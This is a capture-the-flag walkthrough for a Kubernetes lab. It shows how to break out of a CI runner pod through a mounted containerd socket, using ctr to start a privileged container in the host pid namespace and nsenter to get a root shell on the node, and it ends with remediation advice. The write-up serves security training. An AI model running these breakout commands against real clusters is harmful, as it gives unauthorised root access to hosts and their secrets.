# Scenario: CI Runner Next Generation Breakout

- [Learning Outcomes](#learning-outcomes)
- [Challenge Description](#challenge-description)
- [Guided Walkthrough](#guided-walkthrough)
  - [Step 1: Enumerate resources and discovery of the mounted containerd socket](#step-1-enumerate-resources-and-discovery-of-the-mounted-containerd-socket)
  - [Step 2: Discovering ctr and interacting with containerd](#step-2-discovering-ctr-and-interacting-with-containerd)
  - [Step 3: Using ctr to pull an image](#step-3-using-ctr-to-pull-an-image)
  - [Step 4: Running a container with access to the host pid namespace](#step-4-running-a-container-with-access-to-the-host-pid-namespace)
  - [Step 5: Step 5: Container breakout and capture the flag](#step-5-container-breakout-and-capture-the-flag)
- [Remediation and Security Considerations](#remediation-and-security-considerations)

## Learning Outcomes

The purpose of CI Runner Next Generation Breakout is to teach participants about another way of obtaining container breakout. The go to example of container breakout is the mounting of the Docker socket which allows access to the Docker daemon and the underlying host as the process is running under effective UID 0. Whilst there are CI runners still using Docker, Kubernetes deprecated Docker as a container runtime after v1.20. For this scenario, the containerd socket is mounted and participants will learn how to use `ctr`, the containerd command-line client, to escape the CI container.

## Challenge Description

```
During penetration testing of a client kubernetes cluster, a vulnerability in a pod has been noticed.
The pod is part of the client build infrastructure and you are concerned that a compromise may lead to leaked secrets within the target cluster.
Verify the vulnerability by extracting the secret access key from another pod in the ci-server-vulnerability namespace.

You will start in the jenk-5ym3 pod in the ci-server-vulnerability namespace.
```

## Guided Walkthrough

### Step 1: Enumerate resources and discovery of the mounted containerd socket

The first step is to enumerate what resources are available to us. The challenge description has already informed us that we are investigating pod which is verified by looking at the environment variables set.

```bash
root@jenk-ng-runner-s82n6-7dc596dcd4-nlfrq:~# env
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_SERVICE_PORT=443
HOSTNAME=jenk-ng-runner-s82n6-7dc596dcd4-nlfrq
PWD=/root
HOME=/root
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
TERM=xterm
SHLVL=1
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
KUBERNETES_SERVICE_HOST=10.96.0.1
KUBERNETES_PORT=tcp://10.96.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env
```

A quick search shows that we don't have access to `kubectl`

```bash
root@jenk-ng-runner-s82n6-7dc596dcd4-nlfrq:~# which kubectl

```

There is a service account token mounted at `/var/run/secrets/kubernetes.io/serviceaccount/token` which we can use to authenticate to the API server. But if we download `kubectl`, we soon discover the service account token has no permissions in the normal Kubernetes namespace.

> Note: the `kubectl` binary can downloaded from the [Kubernetes release page](https://kubernetes.io/releases/)

```bash
root@jenk-ng-runner-s82n6-7dc596dcd4-nlfrq:/usr/bin# kubectl auth can-i --list -n default
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```

```
root@jenk-ng-runner-s82n6-7dc596dcd4-nlfrq:/usr/bin# kubectl auth can-i --list -n kube-system
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]

```

As the focus of the challenge is container breakout, let's turn our attention back to enumerating the container. Let's enumerate the processes running in the container and see if we have access to host processes.

```bash
root@jenk-ng-runner-s82n6-7dc596dcd4-nlfrq:~# ls -l /proc
total 0
dr-xr-xr-x  9 root root    0 Nov 24 09:15 1
dr-xr-xr-x  9 root root    0 Nov 24 09:36 552
dr-xr-xr-x  9 root root    0 Nov 24 09:18 7
drwxrwxrwt  2 root root   40 Nov 24 09:15 acpi
-r--r--r--  1 root root    0 Nov 24 09:36 bootconfig
...
```

Based the processes shown looks like we only have access to container level processes. Let's check what mounts are available to us.

```bash
root@jenk-ng-runner-s82n6-7dc596dcd4-nlfrq:~# mount
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/31/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/30/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/29/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/28/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/27/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/26/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/25/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/32/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/32/work)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
sysfs on /sys type sysfs (ro,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup type cgroup2 (ro,nosuid,nodev,noexec,relatime)
/dev/root on /tmp type ext4 (rw,relatime,discard,errors=remount-ro)
tmpfs on /run/containerd type tmpfs (rw,nosuid,nodev,size=803020k,nr_inodes=819200,mode=755,inode64)
shm on /run/containerd/io.containerd.grpc.v1.cri/sandboxes/44aa90ac50efbc3615d6fccdf282496b99b422cadb6d343dace2324e7b59894c/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k,inode64)
shm on /run/containerd/io.containerd.grpc.v1.cri/sandboxes/ade84373045548817d433973a4262e7337ab42c479cfc971d470fbe1364832f9/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k,inode64)
overlay on /run/containerd/io.containerd.runtime.v2.task/k8s.io/44aa90ac50efbc3615d6fccdf282496b99b422cadb6d343dace2324e7b59894c/rootfs type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/2/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/3/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/3/work)
overlay on /run/containerd/io.containerd.runtime.v2.task/k8s.io/ade84373045548817d433973a4262e7337ab42c479cfc971d470fbe1364832f9/rootfs type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/2/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/4/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/4/work)
overlay on /run/containerd/io.containerd.runtime.v2.task/k8s.io/0f23353e98124a395e40faf6f3dbaffaf4bf755c39c22d8b4abd043b3238dc4f/rootfs type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/18/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/17/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/15/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/19/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/19/work)
overlay on /run/containerd/io.containerd.runtime.v2.task/k8s.io/0c2c141dc89f81fe447b4f72a0a1b44476cad1c4563048efd8281284e441284a/rootfs type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/21/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/20/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/23/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/23/work)
shm on /run/containerd/io.containerd.grpc.v1.cri/sandboxes/e244990abbca170901181dfa973ba66b3f546302a75b215491f97b380b19d1b8/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k,inode64)
overlay on /run/containerd/io.containerd.runtime.v2.task/k8s.io/e244990abbca170901181dfa973ba66b3f546302a75b215491f97b380b19d1b8/rootfs type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/2/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/24/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/24/work)
overlay on /run/containerd/io.containerd.runtime.v2.task/k8s.io/21167717787a6525fe4667a634b0e57350a1caf1d01ee5ef411863eec3ae7137/rootfs type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/31/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/30/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/29/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/28/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/27/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/26/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/25/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/32/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/32/work)
overlay on /run/containerd/io.containerd.runtime.v2.task/k8s.io/21167717787a6525fe4667a634b0e57350a1caf1d01ee5ef411863eec3ae7137/rootfs type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/31/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/30/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/29/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/28/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/27/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/26/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/25/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/32/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/32/work)
proc on /run/containerd/io.containerd.runtime.v2.task/k8s.io/21167717787a6525fe4667a634b0e57350a1caf1d01ee5ef411863eec3ae7137/rootfs/proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /run/containerd/io.containerd.runtime.v2.task/k8s.io/21167717787a6525fe4667a634b0e57350a1caf1d01ee5ef411863eec3ae7137/rootfs/dev type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
devpts on /run/containerd/io.containerd.runtime.v2.task/k8s.io/21167717787a6525fe4667a634b0e57350a1caf1d01ee5ef411863eec3ae7137/rootfs/dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
mqueue on /run/containerd/io.containerd.runtime.v2.task/k8s.io/21167717787a6525fe4667a634b0e57350a1caf1d01ee5ef411863eec3ae7137/rootfs/dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
sysfs on /run/containerd/io.containerd.runtime.v2.task/k8s.io/21167717787a6525fe4667a634b0e57350a1caf1d01ee5ef411863eec3ae7137/rootfs/sys type sysfs (ro,nosuid,nodev,noexec,relatime)
cgroup on /run/containerd/io.containerd.runtime.v2.task/k8s.io/21167717787a6525fe4667a634b0e57350a1caf1d01ee5ef411863eec3ae7137/rootfs/sys/fs/cgroup type cgroup2 (ro,nosuid,nodev,noexec,relatime)
/dev/root on /run/containerd/io.containerd.runtime.v2.task/k8s.io/21167717787a6525fe4667a634b0e57350a1caf1d01ee5ef411863eec3ae7137/rootfs/tmp type ext4 (rw,relatime,discard,errors=remount-ro)
/dev/root on /etc/hosts type ext4 (rw,relatime,discard,errors=remount-ro)
/dev/root on /dev/termination-log type ext4 (rw,relatime,discard,errors=remount-ro)
/dev/root on /etc/hostname type ext4 (rw,relatime,discard,errors=remount-ro)
/dev/root on /etc/resolv.conf type ext4 (rw,relatime,discard,errors=remount-ro)
shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k,inode64)
/dev/root on /var/lib/containerd type ext4 (rw,relatime,discard,errors=remount-ro)
tmpfs on /run/secrets/kubernetes.io/serviceaccount type tmpfs (ro,relatime,size=3912688k,inode64)
proc on /proc/bus type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/fs type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/irq type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/sys type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/sysrq-trigger type proc (ro,nosuid,nodev,noexec,relatime)
tmpfs on /proc/acpi type tmpfs (ro,relatime,inode64)
tmpfs on /proc/kcore type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
tmpfs on /proc/keys type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
tmpfs on /proc/timer_list type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
tmpfs on /proc/scsi type tmpfs (ro,relatime,inode64)
tmpfs on /sys/firmware type tmpfs (ro,relatime,inode64)
```

Interesting we are seeing a lot of `overlay` mounts in association with `containerd`. This is not normal. Let's have a look at the `/var/run/containerd` directory.

```bash
root@jenk-ng-runner-s82n6-7dc596dcd4-nlfrq:/var/run/containerd# ls -la
total 4
drwx--x--x 7 root root  180 Nov 24 09:15 .
drwxr-xr-x 1 root root 4096 Nov 24 09:15 ..
srw-rw---- 1 root root    0 Nov 24 09:13 containerd.sock
srw-rw---- 1 root root    0 Nov 24 09:13 containerd.sock.ttrpc
drwxr-xr-x 4 root root   80 Nov 24 09:15 io.containerd.grpc.v1.cri
drwx--x--x 2 root root   40 Nov 24 09:13 io.containerd.runtime.v1.linux
drwx--x--x 3 root root   60 Nov 24 09:15 io.containerd.runtime.v2.task
drwx------ 3 root root   60 Nov 24 09:15 runc
drw------- 2 root root  100 Nov 24 09:15 s
```

It looks like we have access to the containerd socket.

### Step 2: Discovering ctr and interacting with containerd

So we have access to containerd socket but how do we access and interact with containerd. A quick search on the internet returns the [containerd via CLI](https://github.com/containerd/containerd/blob/main/docs/getting-started.md#interacting-with-containerd-via-cli) which shows us that we can use `ctr` to interact with containerd. Let' see if we have access to it.

```bash
root@jenk-ng-runner-s82n6-7dc596dcd4-nlfrq:/var/run/containerd# which ctr
/usr/local/bin/ctr
```

Great, we have access to `ctr`. Let's see what we can do with it.

```bash
root@jenk-ng-runner-s82n6-7dc596dcd4-nlfrq:/var/run/containerd# ctr --help
NAME:
   ctr -
        __
  _____/ /______
 / ___/ __/ ___/
/ /__/ /_/ /
\___/\__/_/

containerd CLI


USAGE:
   ctr [global options] command [command options] [arguments...]

VERSION:
   1.6.14~ds1

DESCRIPTION:

ctr is an unsupported debug and administrative client for interacting
with the containerd daemon. Because it is unsupported, the commands,
options, and operations are not guaranteed to be backward compatible or
stable from release to release of the containerd project.

COMMANDS:
   plugins, plugin            provides information about containerd plugins
   version                    print the client and server versions
   containers, c, container   manage containers
   content                    manage content
   events, event              display containerd events
   images, image, i           manage images
   leases                     manage leases
   namespaces, namespace, ns  manage namespaces
   pprof                      provide golang pprof outputs for containerd
   run                        run a container
   snapshots, snapshot        manage snapshots
   tasks, t, task             manage tasks
   install                    install a new package
   oci                        OCI tools
   shim                       interact with a shim directly
   help, h                    Shows a list of commands or help for one command

GLOBAL OPTIONS:
   --debug                      enable debug output in logs
   --address value, -a value    address for containerd's GRPC server (default: "/run/containerd/containerd.sock") [$CONTAINERD_ADDRESS]
   --timeout value              total timeout for ctr commands (default: 0s)
   --connect-timeout value      timeout for connecting to containerd (default: 0s)
   --namespace value, -n value  namespace to use with commands (default: "default") [$CONTAINERD_NAMESPACE]
   --help, -h                   show help
   --version, -v                print the version
```

There are quite a few options but the most interesting are the ability to manage images (`images`), running containers (`containers`) and tasks (`tasks`). As we have access to the containerd socket, if we can spawn a container with access to the host pid namespace, we can use `nsenter` to access the host. But first we need to download an image, specifically one with `nsenter` installed.

### Step 3: Using ctr to pull an image

There are a couple of ways of running `nsenter` via a container. We could leverage a well known distribution such as `ubuntu:latest` or `alpine:latest` which has `nsenter` pre-installed and then `exec` into the spawned container to run it. We could also set the entrypoint of the container to `nsenter` and then run the container. For this scenario, we will use the former method.

> Note: We recommend that you learn to build your own container to do this. It is tempting to use an image from DockerHub but you have no idea of what else is included in the image. It is far better to build your own image from source to understand what is included in the image. Here is a link to an example repository by Justin Cormack [nsenter-dockerfile](https://github.com/justincormack/nsenter1).

Let's look at the options for `images`.

```bash
root@jenk-ng-runner-s82n6-7dc596dcd4-nlfrq:/var/run/containerd# ctr image --help
NAME:
   ctr images - manage images

USAGE:
   ctr images command [command options] [arguments...]

COMMANDS:
   check                    check existing images to ensure all content is available locally
   export                   export images
   import                   import images
   list, ls                 list images known to containerd
   mount                    mount an image to a target path
   unmount                  unmount the image from the target
   pull                     pull an image from a remote
   push                     push an image to a remote
   delete, del, remove, rm  remove one or more images by reference
   tag                      tag an image
   label                    set and clear labels for an image
   convert                  convert an image

OPTIONS:
   --help, -h  show help

```

It looks like we can pull images from a remote registry. Let's try pulling the `ubuntu:latest` image.

> Note: When we use the `docker` cli to pull an image we can use the docker.io registry without specifying it. This is because the docker cli will default to the docker.io registry. However, `ctr` does not do this and we need to specify the registry.

```bash
root@jenk-ng-runner-s82n6-7dc596dcd4-nlfrq:/var/run/containerd# ctr image pull registry.hub.docker.com/library/ubuntu:latest
registry.hub.docker.com/library/ubuntu:latest:                                    resolved       |++++++++++++++++++++++++++++++++++++++|
index-sha256:2b7412e6465c3c7fc5bb21d3e6f1917c167358449fecac8176c6e496e5c1f05f:    done           |++++++++++++++++++++++++++++++++++++++|
manifest-sha256:c9cf959fd83770dfdefd8fb42cfef0761432af36a764c077aed54bbc5bb25368: done           |++++++++++++++++++++++++++++++++++++++|
layer-sha256:aece8493d3972efa43bfd4ee3cdba659c0f787f8f59c82fb3e48c87cbb22a12e:    done           |++++++++++++++++++++++++++++++++++++++|
config-sha256:e4c58958181a5925816faa528ce959e487632f4cfd192f8132f71b32df2744b4:   done           |++++++++++++++++++++++++++++++++++++++|
elapsed: 2.9 s                                                                    total:  28.2 M (9.7 MiB/s)
unpacking linux/amd64 sha256:2b7412e6465c3c7fc5bb21d3e6f1917c167358449fecac8176c6e496e5c1f05f...
done: 1.433770706s
```

Excellent we have our ubuntu image, let's see if we can run it.

### Step 4: Running a container with access to the host pid namespace

For a container to access the host pid, we need to run it as `privileged` whilst ensuring we specify a `pid` namespace. Let's see if we can do this with `ctr`.

```bash
root@jenk-ng-runner-s82n6-7dc596dcd4-nlfrq:/var/run/containerd# ctr run --help
NAME:
   ctr run - run a container

USAGE:
   ctr run [command options] [flags] Image|RootFS ID [COMMAND] [ARG...]

OPTIONS:
   --rm                                    remove the container after running
   --null-io                               send all IO to /dev/null
   --log-uri value                         log uri
   --detach, -d                            detach from the task after it has started execution
   --fifo-dir value                        directory used for storing IO FIFOs
   --cgroup value                          cgroup path (To disable use of cgroup, set to "" explicitly)
   --platform value                        run image for specific platform
   --cni                                   enable cni networking for the container
   --runc-binary value                     specify runc-compatible binary
   --runc-root value                       specify runc-compatible root
   --runc-systemd-cgroup                   start runc with systemd cgroup manager
   --uidmap container-uid:host-uid:length  run inside a user namespace with the specified UID mapping range; specified with the format container-uid:host-uid:length
   --gidmap container-gid:host-gid:length  run inside a user namespace with the specified GID mapping range; specified with the format container-gid:host-gid:length
   --remap-labels                          provide the user namespace ID remapping to the snapshotter via label options; requires snapshotter support
   --cpus value                            set the CFS cpu quota (default: 0)
   --cpu-shares value                      set the cpu shares (default: 1024)
   --snapshotter value                     snapshotter name. Empty value stands for the default value. [$CONTAINERD_SNAPSHOTTER]
   --snapshotter-label value               labels added to the new snapshot for this container.
   --config value, -c value                path to the runtime-specific spec config file
   --cwd value                             specify the working directory of the process
   --env value                             specify additional container environment variables (e.g. FOO=bar)
   --env-file value                        specify additional container environment variables in a file(e.g. FOO=bar, one per line)
   --label value                           specify additional labels (e.g. foo=bar)
   --annotation value                      specify additional OCI annotations (e.g. foo=bar)
   --mount value                           specify additional container mount (e.g. type=bind,src=/tmp,dst=/host,options=rbind:ro)
   --net-host                              enable host networking for the container
   --privileged                            run privileged container
   --read-only                             set the containers filesystem as readonly
   --runtime value                         runtime name (default: "io.containerd.runc.v2")
   --runtime-config-path value             optional runtime config path
   --tty, -t                               allocate a TTY for the container
   --with-ns value                         specify existing Linux namespaces to join at container runtime (format '<nstype>:<path>')
   --pid-file value                        file path to write the task's pid
   --gpus value                            add gpus to the container
   --allow-new-privs                       turn off OCI spec's NoNewPrivileges feature flag
   --memory-limit value                    memory limit (in bytes) for the container (default: 0)
   --device value                          file path to a device to add to the container; or a path to a directory tree of devices to add to the container
   --cap-add value                         add Linux capabilities (Set capabilities with 'CAP_' prefix)
   --cap-drop value                        drop Linux capabilities (Set capabilities with 'CAP_' prefix)
   --seccomp                               enable the default seccomp profile
   --seccomp-profile value                 file path to custom seccomp profile. seccomp must be set to true, before using seccomp-profile
   --apparmor-default-profile value        enable AppArmor with the default profile with the specified name, e.g. "cri-containerd.apparmor.d"
   --apparmor-profile value                enable AppArmor with an existing custom profile
   --rdt-class value                       name of the RDT class to associate the container with. Specifies a Class of Service (CLOS) for cache and memory bandwidth management.
   --rootfs                                use custom rootfs that is not managed by containerd snapshotter
   --no-pivot                              disable use of pivot-root (linux only)
   --cpu-quota value                       Limit CPU CFS quota (default: -1)
   --cpu-period value                      Limit CPU CFS period (default: 0)
   --rootfs-propagation value              set the propagation of the container rootfs
```

Once again there are a lot of options but the ones we are interested in are `--privileged` and `--with-ns`. Let's try running the container.

```bash
root@jenk-ng-runner-s82n6-7dc596dcd4-nlfrq:/var/run/containerd# ctr run -d --rm --privileged --with-ns pid:/proc/1/ns/pid registry.hub.docker.com/library/ubuntu:latest containerd-breakout
```

Let's check if the container is running. For this we will need `tasks`.

```bash
root@jenk-ng-runner-s82n6-7dc596dcd4-nlfrq:/var/run/containerd# ctr tasks --help
NAME:
   ctr tasks - manage tasks

USAGE:
   ctr tasks command [command options] [arguments...]

COMMANDS:
   attach                   attach to the IO of a running container
   checkpoint               checkpoint a container
   delete, del, remove, rm  delete one or more tasks
   exec                     execute additional processes in an existing container
   list, ls                 list tasks
   kill                     signal a container (default: SIGTERM)
   pause                    pause an existing container
   ps                       list processes for container
   resume                   resume a paused container
   start                    start a container that has been created
   metrics, metric          get a single data point of metrics for a task with the built-in Linux runtime

OPTIONS:
   --help, -h  show help

```

```bash
root@jenk-ng-runner-s82n6-7dc596dcd4-nlfrq:/var/run/containerd# ctr tasks ls
TASK                   PID      STATUS
containerd-breakout    28387    RUNNING
```

Excellent. Let's try to `exec` into the container and run `nsenter`

### Step 5: Container breakout and capture the flag

Based on the previous step, we know that for a task we can use `exec` to run additional processes. Let's try to `exec` into the container and run `/bin/bash`.

```bash
root@jenk-ng-runner-s82n6-7dc596dcd4-nlfrq:/var/run/containerd# ctr tasks exec -t --exec-id x containerd-breakout bash
root@node-1:/#
```

Great, we can see that we have spawned a new process and it looks like we are running on the node. Looks at `/proc` we can see that we have access to the host pid namespace.

```bash
root@node-1:/# ls -al /proc
total 4
dr-xr-xr-x 194 root  root                0 Nov 24 10:36 .
drwxr-xr-x   1 root  root             4096 Nov 24 10:36 ..
dr-xr-xr-x   9 root  root                0 Nov 24 10:41 1
dr-xr-xr-x   9 root  root                0 Nov 24 10:41 10
dr-xr-xr-x   9 root  root                0 Nov 24 10:41 100
dr-xr-xr-x   9 root  root                0 Nov 24 10:41 101
dr-xr-xr-x   9 root  root                0 Nov 24 10:41 102
dr-xr-xr-x   9 root  root                0 Nov 24 10:41 103
dr-xr-xr-x   9 root  root                0 Nov 24 10:41 1032
dr-xr-xr-x   9 root  root                0 Nov 24 10:41 104
dr-xr-xr-x   9 root  root                0 Nov 24 10:41 105
dr-xr-xr-x   9 root  root                0 Nov 24 10:41 106
dr-xr-xr-x   9 root  root                0 Nov 24 10:41 107
dr-xr-xr-x   9 root  root                0 Nov 24 10:41 109
dr-xr-xr-x   9 root  root                0 Nov 24 10:41 1091
dr-xr-xr-x   9 root  root                0 Nov 24 10:41 1095
dr-xr-xr-x   9 root  root                0 Nov 24 10:41 11
dr-xr-xr-x   9 root  root                0 Nov 24 10:41 111
dr-xr-xr-x   9 root  root                0 Nov 24 10:41 112
dr-xr-xr-x   9 root  root                0 Nov 24 10:41 113
dr-xr-xr-x   9 root  root                0 Nov 24 10:41 12
dr-xr-xr-x   9 root  root                0 Nov 24 10:41 122
dr-xr-xr-x   9 root  root                0 Nov 24 10:41 125
dr-xr-xr-x   9 root  root                0 Nov 24 10:41 126
dr-xr-xr-x   9 root  root                0 Nov 24 10:41 13
dr-xr-xr-x   9 root  root                0 Nov 24 10:41 131
dr-xr-xr-x   9 root  root                0 Nov 24 10:41 132
dr-xr-xr-x   9 root  root                0 Nov 24 10:41 133
dr-xr-xr-x   9 root  root                0 Nov 24 10:41 14
dr-xr-xr-x   9 root  root                0 Nov 24 10:41 15
dr-xr-xr-x   9 root  root                0 Nov 24 10:41 1512
dr-xr-xr-x   9 root  root                0 Nov 24 10:41 1560
dr-xr-xr-x   9 root  root                0 Nov 24 10:41 16
dr-xr-xr-x   9 root  root                0 Nov 24 10:41 173
dr-xr-xr-x   9 root  root                0 Nov 24 10:41 18
...
```

We still need access to the remaining Linux namespaces though so let's use `nsenter` to access them.

```bash
root@node-1:/# nsenter -t 1 -i -u -n -m bash
tput: No value for $TERM and no -T specified
tput: No value for $TERM and no -T specified

root@node-1:/[0]$
```

We're in! A quick look into the `/root` directory shows us that there is a flag file.

```bash
root@node-1:/[0]$ ls -la /root/
total 36
drwx------  5 root root 4096 Nov 24 09:15 .
drwxr-xr-x 19 root root 4096 Nov 24 09:13 ..
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  4 root root 4096 Nov 24 09:13 .gnupg
-rw-r--r--  1 root root  161 Nov 24 09:15 .profile
drwx------  2 root root 4096 Jan 23  2023 .ssh
-rw-r--r--  1 root root  165 Jan 23  2023 .wget-hsts
-rw-r--r--  1 root root   45 Nov 24 09:15 flag.txt
drwx------  4 root root 4096 Jan 23  2023 snap
```

Let's get the flag.

```bash
root@node-1:/[0]$ cat /root/flag.txt
flag_ctf{NextGenAutomationBreakoutAchievedTM}
```

Congratulations, you have completed CI Runner NG Breakout.

## Remediation and Security Considerations

This CTF scenario has a pretty simple remediation plan, don't give access to the containerd socket for building container images in CI runners. [Kaniko](https://github.com/GoogleContainerTools/kaniko) or [Buildah](https://github.com/containers/buildah) can be used without root privileges to build container images.
